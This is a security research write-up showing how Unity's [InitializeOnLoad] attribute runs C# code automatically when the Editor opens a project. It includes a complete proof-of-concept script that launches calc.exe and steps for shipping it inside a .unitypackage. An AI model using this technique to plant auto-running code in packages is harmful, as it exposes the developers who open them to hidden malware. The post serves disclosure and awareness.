# Leveraging the Unity Editor to Execute Arbitrary Code


### Overview of Unity Editor

The Unity Editor is a comprehensive development environment used for creating interactive 2D and 3D content, such as video games, simulations, and other visual experiences. It provides a robust set of tools for asset import, scene creation, animation, and scripting. Unity supports multiple platforms, allowing developers to build applications for PC, consoles, mobile devices, and VR/AR systems. With an intuitive interface and a powerful API, Unity Editor is widely used by developers, gamers, artists, and designers to bring their creative visions to life efficiently and collaboratively.

## Let's Explore How it Works

The focus of this research was to determine how the Unity Editor can be exploited to execute arbitrary code, allowing malicious actors to spread malware by embedding malicious C# in a unity package. By leveraging the `InitializeOnLoad` attribute, which triggers code execution when the Unity Editor starts, we explore how a seemingly benign Unity package could contain harmful scripts. The following research aims to demonstrate the steps needed to inject and execute code.

### What is [InitializeOnLoad]?

The [InitializeOnLoad] attribute in Unity is used to execute static constructors or static methods when the Unity Editor loads. It ensures that the marked class's static constructor runs automatically upon the editor's startup, making it useful for initializing editor-specific code, registering custom menu items, or setting up configurations without needing manual intervention from the user.

### How Unity Compiles and Executes Scripts

Unity uses a specific process to compile and execute scripts:

1. **Script Compilation**:
    
    - **C# Scripts**: Unity compiles all C# scripts into assemblies using the Roslyn compiler.
    - **Assembly Definition Files**: These files can define custom assemblies to organize scripts and control compilation order.
    - **Editor Scripts**: Scripts placed in `Editor` folders are compiled separately into editor-only assemblies.

2. **Execution Order**:
    
    - **Initialization**: When the Unity Editor or a game starts, Unity initializes the engine, loading assemblies and executing static constructors.
    - **Attributes**: Scripts with attributes like `[InitializeOnLoad]` or `[RuntimeInitializeOnLoadMethod]` run their static constructors or methods at the appropriate time (editor load or runtime start).
    - **MonoBehaviour Lifecycle**: Unity calls lifecycle methods (`Awake`, `Start`, `Update`, etc.) on scripts derived from `MonoBehaviour`.



## Putting it All Together - Proof of Concept

### Creating the Script

I wrote a basic script which executes `calc.exe` to demonstrate my PoC.

**Declare Using Directives**:

```csharp
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using UnityEditor;
```

- These namespaces are included to use necessary classes and methods for process handling, interoperability, and Unity Editor attributes.

**Class Declaration**:

```csharp
[InitializeOnLoad]
public class AutoLaunchCalculator
```

- The class `AutoLaunchCalculator` is marked with `[InitializeOnLoad]`, ensuring the static constructor is called when the Unity Editor loads.

**ExecuteCalculator Method**:

```csharp
private static void ExecuteCalculator()
{
    ProcessStartInfo psi = new ProcessStartInfo
    {
        FileName = "calc.exe",
        WindowStyle = ProcessWindowStyle.Normal
    };

    using (Process process = Process.Start(psi))
    {
        process.WaitForExit(); // Optionally wait for the process to exit
    }
}
```

**ProcessStartInfo Setup**:
- `FileName = "calc.exe"`: Specifies the program to run (Calculator).
- `WindowStyle = ProcessWindowStyle.Normal`:  The system displays a window with [Normal](https://learn.microsoft.com/en-us/dotnet/api/system.diagnostics.processwindowstyle?view=net-8.0#system-diagnostics-processwindowstyle-normal) style on the screen, in a default location.
  
**Starting the Process**:
- `Process.Start(psi)`: Starts the Calculator process using the specified settings.
- `process.WaitForExit()`: Optionally waits for the process to exit before continuing.


**Complete Script PoC**

```csharp
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using UnityEditor;

[InitializeOnLoad]
public class AutoLaunchCalculator
{
    static AutoLaunchCalculator()
    {
        ExecuteCalculator();
    }

    private static void ExecuteCalculator()
    {
        ProcessStartInfo psi = new ProcessStartInfo
        {
            FileName = "calc.exe",
            WindowStyle = ProcessWindowStyle.Normal
        };

        using (Process process = Process.Start(psi))
        {
            process.WaitForExit();
        }
    }
}
```



### Create Unity Project

1) Within Unity Hub, Click *New Project*
The latest Unity Hub can be found [here](https://unity.com/unity-hub)

2) Select *3D* template, you can choose any template but I will use the 3D template in my demonstration.
![PoCGif](https://i.ibb.co/vYh6LqY/poc-ezgif-com-speed.gif)

3) You can now export the project as a `.unitypackage` with your script and whenever it is opened within the unity editor, it will automatically compile and execute.


## Conclusion

While Unity doesn't provide a direct method for disabling the compilation or execution of arbitrary code within the Unity Editor, this research highlights significant security vulnerabilities that can be exploited if malicious actors embed malicious code within a unity project. This study demonstrated how the [InitializeOnLoad] attribute can be used to run scripts automatically upon the editor's startup, which could potentially be leveraged to launch malicious operations, such as spreading malware within Unity-based projects.


